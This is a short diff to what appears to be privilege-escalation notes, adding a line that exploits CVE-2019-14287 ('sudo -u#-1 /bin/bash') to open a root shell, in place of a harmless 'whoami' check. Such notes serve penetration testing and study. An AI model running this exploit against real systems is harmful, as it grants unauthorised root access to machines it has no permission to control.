@@ -40,4 +40,7 @@ sysinfo - for root
 sudo -l
 see what commands you can run
 
-sudo -u#-1 whoami (CVE-2019-14287)
+sudo -l
+/bin/bash
+sudo -u#-1 /bin/bash (CVE-2019-14287)
+
